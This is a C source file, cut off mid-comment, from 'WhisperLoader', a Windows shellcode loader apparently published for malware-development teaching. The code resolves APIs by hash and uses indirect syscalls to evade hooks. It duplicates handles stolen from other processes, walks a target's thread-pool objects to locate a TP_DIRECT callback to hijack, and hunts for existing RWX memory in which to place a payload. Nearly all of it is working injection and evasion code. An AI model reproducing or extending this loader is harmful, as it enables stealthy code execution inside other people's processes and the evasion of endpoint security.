// Copyright 2026 MalDev Academy
// WhisperLoader - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/WhisperLoader

#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Compiler Configuration

//
// When set to TRUE, the implementation spawns Writer and Flipper children with 
// MITIGATION_POLICY_HARDENED and other hardening flags enabled.
//
#define SPAWN_HARDENED_CHILDREN TRUE

//
// When set to TRUE, the implementation scan each candidate target (in FindTpInjectTargetProcess) for a
// reusable PAGE_EXECUTE_READWRITE region large enough to hold the wrapped payload.
// If found, the Writer/Flipper children skip calling NtAllocateVirtualMemory and
// NtProtectVirtualMemory against the target.
//
#define REUSE_RWX_REGIONS           TRUE

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

API_IMPORTS         g_WinAPIs           = { 0 };
NT_SYSCALLS         g_Syscalls          = { 0 };
TP_INJECT_TARGET    g_tpInjectTarget    = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region Initialization & Cleanup

//
// Resolve every ntdll/kernel32 import by CRC-32B hash, initialize every indirect
// syscall, and probe the three per-kind Tpp*CleanupGroupMemberVFuncs RVAs. Called
// once from wmain before any role dispatch.
//
static BOOL InitializeFunctionsGlobal()
{
    HMODULE hKernel32Module = NULL;
    HMODULE hNtdllModule    = NULL;
    DWORD   dwTppIoRva      = 0x00;
    DWORD   dwTppAlpcRva    = 0x00;
    DWORD   dwTppJobRva     = 0x00;

    if (!(hKernel32Module = GetModuleHandleH(CRC32B_KERNEL32DLL)) || !(hNtdllModule = GetModuleHandleH(CRC32B_NTDLLDLL)))
    {
        DBG("[!] GetModuleHandleH Failed To Resolve KERNEL32/NTDLL");
        return FALSE;
    }

#define RESOLVE_IMPORT(MODULE, FIELD, HASH)                                             \
    do {                                                                                \
        g_WinAPIs.FIELD = (PVOID)GetProcAddressH((MODULE), (HASH));                     \
        if (!g_WinAPIs.FIELD) {                                                         \
            DBG("[!] GetProcAddressH Failed To Resolve " #FIELD);                       \
            return FALSE;                                                               \
        }                                                                               \
    } while (0)

#define RESOLVE_SYSCALL(FIELD, HASH)                                                    \
    do {                                                                                \
        if (!InitializeIndirectSyscall((HASH), &g_Syscalls.FIELD)) {                    \
            DBG("[!] InitializeIndirectSyscall Failed For " #FIELD);                    \
            return FALSE;                                                               \
        }                                                                               \
    } while (0)

    // --- kernel32 exports ---
    RESOLVE_IMPORT(hKernel32Module, pGetThreadDescription,         CRC32B_GETTHREADDESCRIPTION);

    // --- ntdll Rtl helpers ---
    RESOLVE_IMPORT(hNtdllModule,    pRtlFillMemory,                CRC32B_RTLFILLMEMORY);
    RESOLVE_IMPORT(hNtdllModule,    pRtlMoveMemory,                CRC32B_RTLMOVEMEMORY);
    RESOLVE_IMPORT(hNtdllModule,    pRtlCreateProcessParametersEx, CRC32B_RTLCREATEPROCESSPARAMETERSEX);
    RESOLVE_IMPORT(hNtdllModule,    pRtlDestroyProcessParameters,  CRC32B_RTLDESTROYPROCESSPARAMETERS);
    RESOLVE_IMPORT(hNtdllModule,    pRtlInitUnicodeString,         CRC32B_RTLINITUNICODESTRING);

    // --- ntdll Nt (Called Via APCs) ---
    RESOLVE_IMPORT(hNtdllModule,    pNtSetEvent,                   CRC32B_NTSETEVENT);
    RESOLVE_IMPORT(hNtdllModule,    pNtClose,                      CRC32B_NTCLOSE);

    // --- ntdll Tp non-syscall exports ---
    RESOLVE_IMPORT(hNtdllModule,    pTpAllocIoCompletion,          CRC32B_TPALLOCIOCOMPLETION);
    RESOLVE_IMPORT(hNtdllModule,    pTpAllocAlpcCompletion,        CRC32B_TPALLOCALPCCOMPLETION);
    RESOLVE_IMPORT(hNtdllModule,    pTpAllocJobNotification,       CRC32B_TPALLOCJOBNOTIFICATION);
    RESOLVE_IMPORT(hNtdllModule,    pTpReleaseIoCompletion,        CRC32B_TPRELEASEIOCOMPLETION);
    RESOLVE_IMPORT(hNtdllModule,    pTpReleaseAlpcCompletion,      CRC32B_TPRELEASEALPCCOMPLETION);
    RESOLVE_IMPORT(hNtdllModule,    pTpReleaseJobNotification,     CRC32B_TPRELEASEJOBNOTIFICATION);

    // --- Indirect syscalls ---
    RESOLVE_SYSCALL(ntOpenProcess,                   CRC32B_NTOPENPROCESS);
    RESOLVE_SYSCALL(ntQuerySystemInformation,        CRC32B_NTQUERYSYSTEMINFORMATION);
    RESOLVE_SYSCALL(ntOpenThread,                    CRC32B_NTOPENTHREAD);
    RESOLVE_SYSCALL(ntQueryInformationProcess,       CRC32B_NTQUERYINFORMATIONPROCESS);
    RESOLVE_SYSCALL(ntClose,                         CRC32B_NTCLOSE);
    RESOLVE_SYSCALL(ntQueryVirtualMemory,            CRC32B_NTQUERYVIRTUALMEMORY);
    RESOLVE_SYSCALL(ntAllocateVirtualMemory,         CRC32B_NTALLOCATEVIRTUALMEMORY);
    RESOLVE_SYSCALL(ntQueueApcThread,                CRC32B_NTQUEUEAPCTHREAD);
    RESOLVE_SYSCALL(ntProtectVirtualMemory,          CRC32B_NTPROTECTVIRTUALMEMORY);
    RESOLVE_SYSCALL(ntCreateUserProcess,             CRC32B_NTCREATEUSERPROCESS);
    RESOLVE_SYSCALL(ntAlertThread,                   CRC32B_NTALERTTHREAD);
    RESOLVE_SYSCALL(ntSetInformationThread,          CRC32B_NTSETINFORMATIONTHREAD);
    RESOLVE_SYSCALL(ntReadVirtualMemory,             CRC32B_NTREADVIRTUALMEMORY);
    RESOLVE_SYSCALL(ntCreateEvent,                   CRC32B_NTCREATEEVENT);
    RESOLVE_SYSCALL(ntDuplicateObject,               CRC32B_NTDUPLICATEOBJECT);
    RESOLVE_SYSCALL(ntWaitForSingleObject,           CRC32B_NTWAITFORSINGLEOBJECT);
    RESOLVE_SYSCALL(ntSetIoCompletion,               CRC32B_NTSETIOCOMPLETION);
    RESOLVE_SYSCALL(ntQueryInformationWorkerFactory, CRC32B_NTQUERYINFORMATIONWORKERFACTORY);
    RESOLVE_SYSCALL(ntQueryInformationThread,        CRC32B_NTQUERYINFORMATIONTHREAD);

    RESOLVE_SYSCALL(ntCreateNamedPipeFile,           CRC32B_NTCREATENAMEDPIPEFILE);
    RESOLVE_SYSCALL(ntCreateJobObject,               CRC32B_NTCREATEJOBOBJECT);
    RESOLVE_SYSCALL(ntAlpcCreatePort,                CRC32B_NTALPCCREATEPORT);

#undef RESOLVE_IMPORT
#undef RESOLVE_SYSCALL

    // Fetch the three per-kind Tpp*CleanupGroupMemberVFuncs RVAs at runtime, these are unexported and are build-specific.
    // These were hardcoded constants in the https://github.com/Maldev-Academy/TpDirectCallbackHijack project
    dwTppIoRva   = GetTppIopCleanupGroupMemberVFuncsRva(hNtdllModule);
    dwTppAlpcRva = GetTppAlpcpCleanupGroupMemberVFuncsRva(hNtdllModule);
    dwTppJobRva  = GetTppJobpCleanupGroupMemberVFuncsRva(hNtdllModule);

    if (!dwTppIoRva || !dwTppAlpcRva || !dwTppJobRva)
    {
        DBG("[!] One Or More Tpp*CleanupGroupMemberVFuncs Probes Failed");
        return FALSE;
    }

    DBG("[v] TppIopCleanupGroupMemberVFuncs   RVA: 0x%0.8X", dwTppIoRva);
    DBG("[v] TppAlpcpCleanupGroupMemberVFuncs RVA: 0x%0.8X", dwTppAlpcRva);
    DBG("[v] TppJobpCleanupGroupMemberVFuncs  RVA: 0x%0.8X", dwTppJobRva);

    g_WinAPIs.pTppIopCleanupGroupMemberVFuncs   = (PVOID)((PBYTE)hNtdllModule + dwTppIoRva);
    g_WinAPIs.pTppAlpcpCleanupGroupMemberVFuncs = (PVOID)((PBYTE)hNtdllModule + dwTppAlpcRva);
    g_WinAPIs.pTppJobpCleanupGroupMemberVFuncs  = (PVOID)((PBYTE)hNtdllModule + dwTppJobRva);

    return TRUE;
}

//
// Close any handles currently held by g_tpInjectTarget and zero it out.
//
static VOID CleanupTpInjectTarget()
{
    if (g_tpInjectTarget.hIoCompletion)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(g_tpInjectTarget.hIoCompletion);
    }
    
    if (g_tpInjectTarget.hThread)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(g_tpInjectTarget.hThread);
    }
    
    if (g_tpInjectTarget.hProcess)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(g_tpInjectTarget.hProcess);
    }

    RtlZeroMemory(&g_tpInjectTarget, sizeof(g_tpInjectTarget));
}

#pragma endregion   // Initialization & Cleanup

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region Pool Object Walker

//
// FindPoolObjectInTargetPool helper
// 
// Read 8 bytes out of the target's address space.
//
static BOOL ReadRemoteQword(IN HANDLE hProcess, IN PVOID pRemoteAddress, OUT PULONGLONG pOutValue)
{
    SIZE_T      cbNumberOfBytesRead     = 0x00;
    NTSTATUS    ntStatus                = STATUS_SUCCESS;

    // Run NtReadVirtualMemory
    INITIALIZE_SYSCALL(g_Syscalls.ntReadVirtualMemory);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, pRemoteAddress, pOutValue, (ULONG_PTR)sizeof(ULONGLONG), &cbNumberOfBytesRead);
    if (!NT_SUCCESS(ntStatus) || cbNumberOfBytesRead != sizeof(ULONGLONG))
    {
        DBG("[!] NtReadVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
        DBG("[i] NtReadVirtualMemory Read %lu/%lu @ 0x%p", cbNumberOfBytesRead, sizeof(ULONGLONG), pRemoteAddress);
        return FALSE;
    }
    return TRUE;
}

//
// Walk the target's TP_POOL.PoolObjectList looking for a TP_IO, TP_ALPC or
// TP_JOB (identified by matching its CleanupGroupMember.VFuncs pointer against
// the three per-kind TppXpCleanupGroupMemberVFuncs tables). First match of any
// kind wins.
//
// On success, writes only the pool-object fields of g_tpInjectTarget:
// TpObjectFound, pOuterBase, pTpDirectVA (i.e., KeyContext for NtSetIoCompletion),
// pTpDirectCallbackVA (the 8-byte field the Flipper patches), and
// pOriginalCallback (patched into the restore stub's data slot).
//
// FindPoolObjectInTargetPool is called by FindTpInjectTargetProcess.
//
static BOOL FindPoolObjectInTargetPool(IN HANDLE hProcess, IN PVOID pTpPoolVA)
{
    ULONGLONG       ullPoolListHeadVA           = 0x00,
                    ullWalkCursorVA             = 0x00,
                    ullNextFlinkVA              = 0x00,
                    ullCurrentCgmBaseVA         = 0x00,
                    ullCurrentCgmVFuncs         = 0x00,
                    ullFoundOuterBaseVA         = 0x00,
                    ullFoundDirectVA            = 0x00,
                    ullTpDirectCallbackFieldVA  = 0x00,
                    ullOriginalCallbackValue    = 0x00;
    PVOID           pPoolObjectListHead         = NULL;
    ULONG           uWalkIterations             = 0x00,
                    uCgmOffsetInOuter           = 0x00,
                    uDirectOffsetInOuter        = 0x00;
    TP_OBJECT_KIND  Kind                        = TpObjectKindNone;

    if (!hProcess || !pTpPoolVA)
        return FALSE;

    // Reset only the pool-object fields; leave process/thread/RWX state alone.
    g_tpInjectTarget.TpObjectFound       = TpObjectKindNone;
    g_tpInjectTarget.pOuterBase          = NULL;
    g_tpInjectTarget.pTpDirectVA         = NULL;
    g_tpInjectTarget.pTpDirectCallbackVA = NULL;
    g_tpInjectTarget.pOriginalCallback   = NULL;

    pPoolObjectListHead = (PVOID)((ULONG_PTR)pTpPoolVA + offsetof(TP_POOL, PoolObjectList));
    ullPoolListHeadVA   = (ULONGLONG)(ULONG_PTR)pPoolObjectListHead;

    if (!ReadRemoteQword(hProcess, pPoolObjectListHead, &ullNextFlinkVA))
        return FALSE;

    DBG("[i] Walking PoolObjectList @ 0x%p (First Flink=0x%p)",
        pPoolObjectListHead, (PVOID)(ULONG_PTR)ullNextFlinkVA);

    ullWalkCursorVA = ullNextFlinkVA;

    while (ullWalkCursorVA != 0x00 && ullWalkCursorVA != ullPoolListHeadVA && uWalkIterations < POOL_OBJECT_LIST_MAX_ITER)
    {
        // Each PoolObjectList node is a LIST_ENTRY embedded inside a
        // TPP_CLEANUP_GROUP_MEMBER. Back up to the CGM base to read its
        // VFuncs pointer and identify what kind of outer object this is.
        ullCurrentCgmBaseVA = ullWalkCursorVA - offsetof(TPP_CLEANUP_GROUP_MEMBER, PoolObjectLinks);

        if (!ReadRemoteQword(hProcess, (PVOID)(ullCurrentCgmBaseVA + offsetof(TPP_CLEANUP_GROUP_MEMBER, VFuncs)), &ullCurrentCgmVFuncs))
            return FALSE;

        // Match the CGM's VFuncs pointer against the three per-kind tables
        // (resolved at init time via GetTpp*pCleanupGroupMemberVFuncsRva).
        // The match tells us which outer type this node belongs to and gives
        // us the offsets to walk back out to the containing TP_<kind>.
        Kind = TpObjectKindNone;
        if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_WinAPIs.pTppIopCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindIo;
            uCgmOffsetInOuter    = offsetof(TP_IO,   CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_IO,   Direct);
        }
        else if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_WinAPIs.pTppAlpcpCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindAlpc;
            uCgmOffsetInOuter    = offsetof(TP_ALPC, CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_ALPC, Direct);
        }
        else if (ullCurrentCgmVFuncs == (ULONGLONG)(ULONG_PTR)g_WinAPIs.pTppJobpCleanupGroupMemberVFuncs)
        {
            Kind                 = TpObjectKindJob;
            uCgmOffsetInOuter    = offsetof(TP_JOB,  CleanupGroupMember);
            uDirectOffsetInOuter = offsetof(TP_JOB,  Direct);
        }

        if (Kind != TpObjectKindNone)
        {
            // Walk from the CGM to the outer object, then to its embedded
            // TP_DIRECT, then to TP_DIRECT.Callback (the 8-byte field the
            // Flipper patches). One extra remote read captures the current
            // Callback so the restore stub can put it back before the user
            // payload runs.
            ullFoundOuterBaseVA        = ullCurrentCgmBaseVA - uCgmOffsetInOuter;
            ullFoundDirectVA           = ullFoundOuterBaseVA + uDirectOffsetInOuter;
            ullTpDirectCallbackFieldVA = ullFoundDirectVA + offsetof(TP_DIRECT, Callback);

            if (!ReadRemoteQword(hProcess, (PVOID)ullTpDirectCallbackFieldVA, &ullOriginalCallbackValue))
                return FALSE;

            g_tpInjectTarget.TpObjectFound       = Kind;
            g_tpInjectTarget.pOuterBase          = (PVOID)ullFoundOuterBaseVA;
            g_tpInjectTarget.pTpDirectVA         = (PVOID)ullFoundDirectVA;
            g_tpInjectTarget.pTpDirectCallbackVA = (PVOID)ullTpDirectCallbackFieldVA;
            g_tpInjectTarget.pOriginalCallback   = (PVOID)ullOriginalCallbackValue;

            DBG("[+] Found %s @ 0x%p (Iterations %lu); &TP_DIRECT.Callback=0x%p; OriginalCallback=0x%p",
                (Kind == TpObjectKindIo)   ? "TP_IO"   :
                (Kind == TpObjectKindAlpc) ? "TP_ALPC" :
                                             "TP_JOB",
                (PVOID)(ULONG_PTR)ullFoundOuterBaseVA,
                uWalkIterations,
                (PVOID)(ULONG_PTR)ullTpDirectCallbackFieldVA,
                (PVOID)(ULONG_PTR)ullOriginalCallbackValue);

            return TRUE;
        }

        // Not a kind we care about; advance to the next PoolObjectList node.
        if (!ReadRemoteQword(hProcess, (PVOID)ullWalkCursorVA, &ullNextFlinkVA))
            return FALSE;

        ullWalkCursorVA = ullNextFlinkVA;
        uWalkIterations++;
    }

    DBG("[-] Walked %lu PoolObjectList Node(s). No TP_IO / TP_ALPC / TP_JOB Was Found", uWalkIterations);
    return FALSE;
}

#pragma endregion   // Pool Object Walker

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region RWX Region Scanner
//
// Walk the target's user-mode VA looking for a region we can REUSE instead of
// allocating a fresh one. A region qualifies when it is:
//
//   - MEM_COMMIT                       (not reserved, not free)
//   - MEM_PRIVATE                      (reject MEM_IMAGE and MEM_MAPPED)
//   - PAGE_EXECUTE_READWRITE
//   - RegionSize >= cbRequired
//
// First match wins (short-circuit scan).
//
// Caveat: a reused RWX region may be an active JIT code cache. Overwriting
// bytes in it mid-execution can crash the host.
//
// FindRwxRegionInTarget is called by FindTpInjectTargetProcess.
//
static BOOL FindRwxRegionInTarget(IN HANDLE hProcess, IN SIZE_T cbRequired, OUT PVOID* ppRwxBase, OUT PSIZE_T pcbRwxSize)
{
    MEMORY_BASIC_INFORMATION    MbiRegion = { 0 };
    ULONG_PTR                   uCursor = 0x00;
    ULONG_PTR                   uUserLimit = 0x00007FFFFFFE0000ULL;      // x64 user-mode ceiling
    NTSTATUS                    ntStatus = STATUS_SUCCESS;
    SIZE_T                      sReturnLength = 0x00;
    ULONG                       uProtMask = ~((ULONG)(PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE));
    ULONG                       uQueries = 0x00;

    if (!hProcess || !cbRequired || !ppRwxBase || !pcbRwxSize)
        return FALSE;

    *ppRwxBase = NULL;
    *pcbRwxSize = 0x00;

    while (uCursor < uUserLimit)
    {
        RtlZeroMemory(&MbiRegion, sizeof(MbiRegion));

        INITIALIZE_SYSCALL(g_Syscalls.ntQueryVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, (PVOID)uCursor, MemoryBasicInformation, &MbiRegion, sizeof(MbiRegion), &sReturnLength);
        if (!NT_SUCCESS(ntStatus))
            break;

        uQueries++;

        if (MbiRegion.State == MEM_COMMIT && MbiRegion.Type == MEM_PRIVATE &&
            (MbiRegion.Protect & uProtMask) == PAGE_EXECUTE_READWRITE && MbiRegion.RegionSize >= cbRequired)
        {
            *ppRwxBase = MbiRegion.BaseAddress;
            *pcbRwxSize = MbiRegion.RegionSize;

            DBG("[+] Reusable RWX Region Found: 0x%p (%lu bytes, Protect=0x%08X, Type=0x%08X) After %lu Queries",
                MbiRegion.BaseAddress, (ULONG)MbiRegion.RegionSize, MbiRegion.Protect, MbiRegion.Type, uQueries);
            return TRUE;
        }

        if (MbiRegion.RegionSize == 0x00)
            break;

        uCursor = (ULONG_PTR)MbiRegion.BaseAddress + MbiRegion.RegionSize;
    }

    DBG("[-] No Reusable RWX Region Found (Queries=%lu, cbRequired=%lu bytes)", uQueries, (ULONG)cbRequired);
    return FALSE;
}

#pragma endregion   // RWX Region Scanner

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region Target Discovery

//
// FindTpInjectTargetProcess helper.
// 
// Scan a cached SystemExtendedHandleInformation buffer for the first handle in dwTargetPid whose
// kernel type index matches usTypeIndex, and duplicate it into our own process with OBJ_INHERIT
// so it can chain through PS_ATTRIBUTE_HANDLE_LIST down to the Writer (and then on to Flipper).
//
static HANDLE StealHandleOfIndexType(IN PSYSTEM_HANDLE_INFORMATION_EX pHandles, IN HANDLE hTargetProcess, IN DWORD dwTargetPid, IN USHORT usTypeIndex)
{
    PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX  pEntry      = NULL;
    HANDLE                              hStolen     = NULL;
    NTSTATUS                            ntStatus    = STATUS_SUCCESS;

    if (!pHandles || !hTargetProcess || !dwTargetPid)
        return NULL;

    for (ULONG_PTR i = 0; i < pHandles->NumberOfHandles; i++)
    {
        pEntry = &pHandles->Handles[i];

        if ((DWORD)(ULONG_PTR)pEntry->UniqueProcessId != dwTargetPid)
            continue;

        if (pEntry->ObjectTypeIndex != usTypeIndex)
            continue;

        INITIALIZE_SYSCALL(g_Syscalls.ntDuplicateObject);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(
            hTargetProcess,                                                 // SourceProcessHandle
            (HANDLE)pEntry->HandleValue,                                    // SourceHandle 
            NtCurrentProcess(),                                             // TargetProcessHandle
            &hStolen,                                                       // TargetHandle 
            (ULONG_PTR)0x00,                                                // DesiredAccess 
            (ULONG_PTR)OBJ_INHERIT,                                         // HandleAttributes - Must be inheritable because we are handing it to the child processes
            (ULONG_PTR)DUPLICATE_SAME_ACCESS);

        if (NT_SUCCESS(ntStatus) && hStolen)
        {
            return hStolen;
        }

        hStolen = NULL;
    }

    return NULL;
}


//
// FindTpInjectTargetProcess helper.
// 
// Pulls three fields out of a stolen TpWorkerFactory handle via
// NtQueryInformationWorkerFactory(WorkerFactoryBasicInformation):
//
//   - StartParameter : VA of the target's _TP_POOL (what FindPoolObjectInTargetPool walks).
//   - ProcessId      : the PID the factory is bound to; sanity check against the PID we
//                      stole the handle from, so we don't end up walking a TP_POOL that
//                      belongs to a different process's address space.
//   - StartRoutine   : ntdll!TppWorkerThread. Identity marker used downstream to distinguish
//                      a real TPP worker from other WrQueue dwellers (e.g. .NET
//                      PortableThreadPool.IOCompletionPoller) whose kernel wait is not
//                      alertable and will never drain our APCs.
//
static BOOL QueryWorkerFactoryStartParameter(IN HANDLE hFactory, OUT PVOID* ppTpPoolVA, OUT PDWORD pdwFactoryPid, OUT PVOID* ppStartRoutine)
{
    WORKER_FACTORY_BASIC_INFORMATION    Info        = { 0 };
    ULONG                               uReturned   = 0x00;
    NTSTATUS                            ntStatus    = STATUS_SUCCESS;

    if (!hFactory || !ppTpPoolVA || !pdwFactoryPid || !ppStartRoutine)
        return FALSE;

    INITIALIZE_SYSCALL(g_Syscalls.ntQueryInformationWorkerFactory);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hFactory, (ULONG_PTR)WorkerFactoryBasicInformation, &Info, (ULONG_PTR)sizeof(Info), &uReturned);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQueryInformationWorkerFactory Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    *ppTpPoolVA     = Info.StartParameter;
    *pdwFactoryPid  = (DWORD)(ULONG_PTR)Info.ProcessId;
    *ppStartRoutine = Info.StartRoutine;

    DBG("[i] WorkerFactory 0x%p: PID=%lu, TP_POOL=0x%p, StartRoutine=0x%p",
        hFactory, (DWORD)(ULONG_PTR)Info.ProcessId, Info.StartParameter, Info.StartRoutine);
    /*
    DBG("[v] Workers: Total=%lu Waiting=%lu Pending=%lu; Bounds=%lu..%lu",
        Info.TotalWorkerCount, Info.WaitingWorkerCount, Info.PendingWorkerCount, Info.ThreadMinimum, Info.ThreadMaximum);

    DBG("[v] Flags: Paused=%u Shutdown=%u MayCreate=%u BindingCount=%lu",
        (UINT)Info.Paused, (UINT)Info.Shutdown, (UINT)Info.MayCreate, Info.BindingCount);
    */

    return (Info.StartParameter != NULL) ? TRUE : FALSE;
}

//
// FindTpInjectTargetProcess helper.
// 
// Confirm that an opened thread handle actually belongs to a Win32 TPP
// worker (ntdll!TppWorkerThread), as opposed to e.g. a .NET
// PortableThreadPool.IOCompletionPoller thread.
//
// Both sit in ThreadState=Waiting / WaitReason=WrQueue (both wait on a
// KQUEUE), so the snapshot can't tell them
// apart, but only the TPP worker's kernel wait (NtWaitForWorkViaWorkerFactory) is alertable.
// 
// Managed pollers call NtRemoveIoCompletionEx(Alertable=FALSE) and will
// never drain queued user APCs, so our chain hangs forever on them.
//
// NtQueryInformationThread(ThreadQuerySetWin32StartAddress) returns the start
// address the kernel stored at thread creation time. For a TPP worker that is
// ntdll!TppWorkerThread, identical to the StartRoutine from
// WORKER_FACTORY_BASIC_INFORMATION (which is fetched when QueryWorkerFactoryStartParameter is called).
//
static BOOL IsThreadTppWorker(IN HANDLE hThread, IN PVOID pExpectedStartRoutine, OUT PVOID* ppActualStartAddress OPTIONAL)
{
    PVOID       pActualStart    = NULL;
    ULONG       uReturned       = 0x00;
    NTSTATUS    ntStatus        = STATUS_SUCCESS;

    if (!hThread || !pExpectedStartRoutine)
        return FALSE;

    INITIALIZE_SYSCALL(g_Syscalls.ntQueryInformationThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadQuerySetWin32StartAddress, &pActualStart, (ULONG_PTR)sizeof(pActualStart), &uReturned);
    if (!NT_SUCCESS(ntStatus) || uReturned != sizeof(pActualStart))
    {
        DBG("[!] NtQueryInformationThread [ThreadQuerySetWin32StartAddress] Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    if (ppActualStartAddress)
        *ppActualStartAddress = pActualStart;

    return (pActualStart == pExpectedStartRoutine) ? TRUE : FALSE;
}

//
// FindTpInjectTargetProcess helper.
// 
// NtQuerySystemInformation(SystemInformation) wrapper. Dry-run to size the buffer,
// then grow it on STATUS_INFO_LENGTH_MISMATCH until the call succeeds.
//
static BOOL RunNtQuerySystemInformation(OUT PVOID* ppSystemInformation, IN SYSTEM_INFORMATION_CLASS SystemInformation)
{
    PVOID       pBuffer     = NULL;
    PVOID       pTmp        = NULL;
    ULONG       uBufferSize = 0x00;
    NTSTATUS    ntStatus    = STATUS_SUCCESS;
    BOOL        bResult     = FALSE;

    if (!ppSystemInformation)
        return FALSE;

    *ppSystemInformation = NULL;

    // Dry-run to size the buffer.
    INITIALIZE_SYSCALL(g_Syscalls.ntQuerySystemInformation);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(SystemInformation, NULL, 0, &uBufferSize);
    if (!NT_SUCCESS(ntStatus) && ntStatus != STATUS_INFO_LENGTH_MISMATCH)
    {
        DBG("[!] NtQuerySystemInformation Dry Run Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    if (!(pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uBufferSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    // Keep growing the heap until it fits.
    while (TRUE)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntQuerySystemInformation);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(SystemInformation, pBuffer, uBufferSize, &uBufferSize);
        if (ntStatus != STATUS_INFO_LENGTH_MISMATCH)
            break;

#define GROWTH_FACTOR 2
        uBufferSize *= GROWTH_FACTOR;
#undef GROWTH_FACTOR

        if (!(pTmp = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, uBufferSize)))
        {
            DBG("[!] HeapReAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }
        pBuffer = pTmp;
    }

    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    *ppSystemInformation = pBuffer;
    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && pBuffer)
        HeapFree(GetProcessHeap(), 0x00, pBuffer);
    return bResult;
}


//
// Scans the system for a candidate that satisfies all of the following:
//   (a) is 64-bit (not WoW64)
//   (b) has at least one parked pool worker (ThreadState == Waiting && WaitReason == WrQueue)
//   (c) can be opened with process inject rights
//   (d) exposes a TpWorkerFactory handle we can duplicate (so we can get its TP_POOL VA)
//   (e) has at least one TP_IO, TP_ALPC, or TP_JOB inside that pool
//   (f) exposes an IoCompletion handle we can duplicate (so we can fire the Callback)
//   (g) has at least one WrQueue thread whose Win32StartAddress matches the factory's StartRoutine (ntdll!TppWorkerThread)
//
// RWX-reuse behavior (controlled by cbRequiredSize):
//   For each candidate that passes (a)-(g), the scanner tries to find a reusable RWX
//   region of at least cbRequiredSize bytes inside that process. On hit, that candidate
//   wins immediately with bReusedRwx=TRUE / pReusedRwxBase / cbReusedRwxSize set, and
//   the scan stops. On miss, the candidate is snapshotted into a "TP_INJECT_TARGET Fallback" struct
//   (handles stay open) and the scan continues. If no RWX winner is found after
//   scanning every candidate process, the stashed Fallback is promoted into g_tpInjectTarget
//   with bReusedRwx=FALSE and the Writer process takes the classic allocate-and-flip path.
//
// Note on the local Fallback struct: 
//
// The scanner has to hold 2 candidates in flight at the same time: the one it
// is currently evaluating (which goes into g_tpInjectTarget as FindPoolObjectInTargetPool
// fills it) and the earlier non-RWX candidate it has already decided to keep as a
// fallback. If the fallback also lived in g_tpInjectTarget, the next iteration's
// FindPoolObjectInTargetPool call would overwrite it. So the fallback gets its own
// local TP_INJECT_TARGET (handles kept open, pool-object fields snapshotted before
// the next overwrite). The resolution logic:
//
//   - A later iteration finds an RWX winner, we close Fallback's handles, zero it, and the winner lands in g_tpInjectTarget.
//   - Scan ends with no RWX winner found, we copy Fallback back into g_tpInjectTarget and the Writer takes the manual allocation path.
//
